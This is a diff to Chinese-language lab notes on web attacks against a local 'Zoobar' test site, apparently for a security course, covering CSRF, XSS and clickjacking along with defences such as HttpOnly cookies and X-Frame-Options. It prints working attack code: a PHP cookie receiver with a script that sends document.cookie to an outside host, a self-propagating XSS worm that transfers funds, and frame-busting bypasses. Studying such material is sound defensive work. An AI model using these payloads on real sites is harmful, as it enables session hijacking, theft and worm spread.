@@ -221,7 +221,9 @@ Enter passphrase for SSL/TLS keys for www.zoobar.com:443 (RSA): *****
 
 CSRF（Cross-Site Request Forgery），即跨站请求伪造，攻击者通过浏览器本地 cookie 盗用你的身份，以你的名义发送请求，对服务器来说这个请求是完全合法（当前用户已通过站点认证，该站点无法区分受害者发送的合法请求和受害者发送的伪造请求）的，从而就会在你不知情下完成一个攻击设计的恶意操作。以下通过 Zoobars 转账模拟。
 
-cookie 是网站为了辨别用户身份而存储在用户本地终端上的数据（通常经过加密）。这里先总结一下 cookie 相关特点：1. cookie 存储在用户本地浏览器上；2. 记录状态信息（例如在线商店购物车中添加的商品），用户浏览活动（特定按钮、登录或访问过的网站），还可以用于记住用户先前在表单字段输入的任意信息（名称、地址、密码、信用卡号等）；3. cookie 与个人身份有关，身份验证 cookie 是 Web 服务器用来了解用户是否已登录以及他们使用哪个帐户登录的最常用方法。看下此时的 cookie(document 类下)。
+CSRF 步骤：1. 攻击者确定目标网站；2. 在目标站点找到表单，或者可以提交请求的 URL（使用 GET 方法提交的表单，参数都显示在 URL 当中），并构造攻击页面或 URL；3. 为所有表单或 URL 需要的输入提供正确的值；4. 攻击者诱使受害者访问攻击页面或发出 URL。
+
+HTTP 是个无状态的协议，服务器不记录请求之间的关系。cookie 是网站为了辨别用户身份而存储在用户本地终端上的数据（通常经过加密；键值对）。这里先总结一下 cookie 相关特点：1. cookie 存储在用户本地浏览器上；2. 记录状态信息（例如在线商店购物车中添加的商品），用户浏览活动（特定按钮、登录或访问过的网站），还可以用于记住用户先前在表单字段输入的任意信息（名称、地址、密码、信用卡号等）；3. cookie 与个人身份有关，身份验证 cookie 是 Web 服务器用来了解用户是否已登录以及他们使用哪个帐户登录的最常用方法，使用 cookie 可以直接登录，而无需用户名密码。看下此时的 cookie(document 类下)。
 
 ![](https://github.com/Yudreamy/classlater/blob/master/web/exercise3/picture/cookie.PNG)
 
@@ -317,6 +319,155 @@ cookie 是网站为了辨别用户身份而存储在用户本地终端上的数�
 
 ## XSS
 
+XSS (Cross Site Scripting)，即跨站脚本攻击，发生在目标用户的浏览器上，攻击者将恶意脚本被注入到原本的可信任网站中，当渲染 DOM 树的过程中执行了不该执行的 JS 代码时，就发生了 XSS 攻击。当用户浏览到此页面时被注入的脚本就会执行，恶意脚本可以访问浏览器保存的 cookie、会话 token 或者其他的敏感信息，甚至可以重写 HTML 的内容。XSS 跟之前的 CSRF 有所不同，它使用 JavaScript 构建表单，自动提交。
+
+### 获取 cookie
+
+什么时候客户端会执行攻击者注入的代码呢？ $\rightarrow$ 网站接收用户输入，并使用该输入构造页面（显示之类）。最简单的检测方法就是输入 `<script>alert(1);</script>` 看会不会显示弹框，有弹框，说明此处存在可以利用的 XSS 漏洞。例如，想窃取相关内容（如用户 cookie），攻击者需要编写 JS 将 cookie 发送出去，并通过 PHP 代码接收 cookie。
+
+```
+# steal.php
+<?php
+$myfile=fopen("test.txt","w");
+fwrite($myfile,$_GET["cookie"]);
+?>
+
+# cookie 用户的 profile
+<script>(new Image()).src="http://www.fool.com/steal.php?cookie="+document.cookie</script>
+```
+登录用户 alice，访问 cookie，查看结果，可以看到原本为空的 test.txt 文件中接收到了 alice 的 cookie。
+
+![](https://github.com/Yudreamy/classlater/blob/master/web/exercise3/picture/alice.PNG)
+
+![](https://github.com/Yudreamy/classlater/blob/master/web/exercise3/picture/xss-cookie.PNG)
+
+此处的防御可以将 cookie 设置为 HttpOnly，`setcookie ( string $name [, string $value = "" [, int $expires = 0 [, string $path = "" [, string $domain = "" [, bool $secure = FALSE [, bool $httponly = FALSE ]]]]]] ) : bool` 有七个参数，最后一个 $httponly 默认为 false，当为 true 时 cookie 只能通过 HTTP 协议访问，也即我们通过脚本语言来访问 cookie 无法成功。修改 auth.php 中的 setcookie，修改后重启 apache2，再次登录 alice 查看 cookie 用户，发现此时刷新 http://www.fool.com/test.txt 页面已经出现不了 ZoobarLogin 字段了，说明我们的 HttpOnly 设置起作用了。
+
+```
+setcookie($this->cookieName, $cookieData, time() + 31104000,NULL,NULL,NULL,true);
+```
+
+### XSS 蠕虫
+
+XSS 根据其特性和利用方式可以分为三大类：反射型 XSS、存储型 XSS、DOM 型 XSS
+
+* 反射型 XSS。经过后端，不经过数据库。一般出现在 URL 参数或网站搜索栏中，由于需要点击包含恶意代码的 URL 才可以触发，并且只能触发一次，所以也被称为“非持久性 XSS”
+* 存储型 XSS。经过后端，经过数据库。一般出现在网站留言板、评论、个人资料等用户可以对网站写入数据的地方。例如，一个论坛评论由于对用户输入过滤不严格，导致攻击者写入一段窃取 cookie 的恶意 JS 代码到评论处，这段恶意代码就会被写入数据库，从而，当其他用户浏览攻击者页面时，网站从数据库中读取攻击者写入的评论显示到网页中，恶意代码得到执行，导致用户 cookie 被窃取，攻击者无需受害者密码即可登录账户。上边这个攻击就是存储型 XSS，它是持久性 XSS，危害比反射型 XSS 大得多。
+* DOM 型 XSS。不经过后端。基于 DOM 文档对象模型，前端脚本通过 DOM 动态修改页面，由于不与服务器进行交互，代码可见，从前端获取 DOM 中的数据在本地执行。常见的可以操纵 DOM 的对象：URL、location、referer 等。
+
+```
+# 先来看一个查询 view 就可以偷 zoobar 的代码，此前记得在 users.php 中 $allowed_tags 添加 `<script>` 标签。
+<script>
+xmlhttp=new XMLHttpRequest();						# 创建一个 XMLHttpRequest 对象
+xmlhttp.open("POST","https://www.zoobar.com/transfer.php",true);					# 打开一个 URL，true 控制异步
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");		# enctype，默认编码类型
+xmlhttp.send("zoobars=2&recipient=xsszoobar&submission=Send");						# 发送该请求
+</script>
+```
+
+我们需要在 Ajax(Asynchronous JavaScript and XML)(异步的 JavaScript 和 XML) 作用下，完成一个 XSS 蠕虫，蠕虫有传播性，用户浏览页面被感染之后，自己也会成为一个攻击源去感染其他人。Ajax 可以异步执行，局部更新，节省带宽，速度更快；与 JS 不同，Ajax 可以处理回复。新建 xssworm 用户，修改其 profile，代码实现当 xssworm 被他人查看时，完成偷取他人 zoobar 并修改其profile。
+
+```
+# 此处为 xss 蠕虫代码
+<span id=worm>
+<script>
+xmlhttp=new XMLHttpRequest();
+xmlhttp.open("POST","https://www.zoobar.com/transfer.php",false);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("zoobars=2&recipient=xsszoobar&submission=Send");
+
+var str="<span id=worm>";
+str+=document.getElementById("worm").innerHTML+"</span>";		# 构建字符串 str，内容是这串代码本身
+var turnForm=document.createElement("form");				# 构建 form，格式与 profile 页面的一致
+document.body.appendChild(turnForm);
+turnForm.method="post";
+turnForm.action="/index.php";
+var newElement=document.createElement("input");
+newElement.setAttribute("name","profile_update");
+newElement.setAttribute("type","hidden");
+newElement.setAttribute("value",str);
+turnForm.appendChild(newElement);
+var newElement2=document.createElement("input");
+newElement2.setAttribute("name","profile_submit");
+newElement2.setAttribute("type","hidden");
+newElement2.setAttribute("value","Save");
+turnForm.appendChild(newElement2);
+turnForm.submit();											# 提交 form
+</script>
+</span>
+```
+
+![](https://github.com/Yudreamy/classlater/blob/master/web/exercise3/picture/xssworm1.PNG)
+
+![](https://github.com/Yudreamy/classlater/blob/master/web/exercise3/picture/xssworm2.PNG)
+
+类似于 CSRF，XSS蠕虫也是利用浏览器在发 http 请求的时候会自动带上 cookie 导致服务器端无法识别是用户自己的请求还是恶意代码，所以设置 token 验证依然可以进行防御，或者禁用一些标签例如`<script>` 就可以了。
+
+总结下 XSS 存在的三个条件：1. 网站应用程序必须接受用户的输入信息；2. 用户的输入会被网站用来创建动态内容；3. 用户的输入验证不充分。针对的防御主要思路：输入过滤，输出转义。
+
+* 使用白名单黑名单，过滤特殊符号，例如，从用户的输入中删除 `<script>`;
+* httponly cookie，仅在传输 HTTP/HTTPS 请求时才使用 httponly 会话 cookie;
+* SOP(same origin policy)，同源策略，SOP 通过源 `<protocol,domain,port>` 识别每个网站，为每个源创建上下文，存储相关资源。作用：1. 保护 cookie（浏览器保存了很多网站的 cookie，SOP 保证 cookie 只会被提供给产生它的源）；2. 防止 JavaScript 访问 iframe 中其他源的内容；3. 防止 Ajax 跨域请求（使用 CORS 进行安全和应用的折中，在后台代码中加入相应的头部，例 header("Access-Control-Allow-Origin:*");）。
+
+
+## 点击劫持
+
+攻击者覆盖多个透明或不透明层（需要不同页面间层次的切换），以诱使用户点击另一页上的按钮或链接，从而在原始界面上的点击被劫持到了另一个界面。任何网站都可以通过 `<iframe>` 在内容页嵌入其他网站，`Style：z-index` 可以设置元素的层次顺序（(x,y,z)，z 对应三维空间的高度），具有较大 z-index 的元素位于具有较低值元素前面；Opacity 定义了 iframe 的可见百分比（1.0 完全可见；0.0 完全不可见）。区别以下三种方式。
+
+```
+opacity:0~1				# 整个不可见，占空间，点击有反应
+visibility:hidden		# 整个不可见，占空间，点击无反应
+display:none			# 直接把元素从整个文档流中抽离了，不显示也不占空间
+```
+
+下边结合 CSRF 和 ClickJacking 进行攻击。设置 click 用户 profile 为一个引向 `http://www.click.com/` 的名为 `CLICK ME TO SEE TAYLOR SWIFT!` 的按钮，诱使别人点入。`http://www.click.com/` 为一个我们精心设置过的网站，它表面上看是一个美图分享页面，`More` 按钮控制查看更多图片，`exit` 控制退出当前页面返回 `https://www.zoobar.com/users.php`；然而，我们通过点击左上角隐藏的 `show frame` 可以看到，`More` 按钮正好遮盖了底层转账页面的 `Send` 按钮，通过交替图片页面与 iframe 转账页面，达到给 click 转账而 test 用户不自知的效果。实验效果如下。
+
+![](https://github.com/Yudreamy/classlater/blob/master/web/exercise3/picture/see_image.PNG)
+
+![](https://github.com/Yudreamy/classlater/blob/master/web/exercise3/picture/real_image1.PNG)
+
+![](https://github.com/Yudreamy/classlater/blob/master/web/exercise3/picture/real_image2.PNG)
+
+
+## 点击劫持防御
+
+### Frame Busting
+
+网页提供代码，旨在防止网页被加载到 iframe 中。
+
+```
+# 网站对最上层的检查
+if(top.location !=self.location)		# 检查最上层是不是我自己
+	parent.location=self.location;		# 如果不是，把我的上层换成我自己
+
+# 攻击者应对
+<body onUnload="javascript:cause_an_abort;">
+
+# 攻击者设计让用户手动取消 Frame Busting 代码的功能
+<script>
+window.onbeforeunload = function(){
+	return "Do you want to leave PayPal?";
+}
+</script>
+<iframe src="http://www.paypal.com">
+
+# 推荐防护
+<script>
+if(self==top) {
+        document.getElementsByTagName("body")[0].style.display='block';
+}
+else{ top.location = self.location;}
+</script>
+```
+
+### X-Frames-Options
+
+IE8 中提出，用以控制页面能否被 iframe，设置 HTTP 头部：`DENY` 不会嵌入到 iframe 中；`SAMEORIGIN` 同源可嵌入。
+
+```
+header("X-Frame-Options:DENY");				# 任何网站都不允许加载 iframe
+header("X-Frame-Options:SAMEORIGIN");		# 仅同源网站可以
+```
 
 
 # Reference：
@@ -326,3 +477,4 @@ cookie 是网站为了辨别用户身份而存储在用户本地终端上的数�
 - [x] [Ubuntu 下 Apache 配置域名](https://www.jianshu.com/p/81be4732af9f)
 - [x] [CSRF & XSS](https://www.familyhealth.top/?p=660)
 - [x] [课程知乎](https://zhuanlan.zhihu.com/p/51874839)
+- [x] [XSS 分类](https://www.kanxue.com/book-6-39.htm)
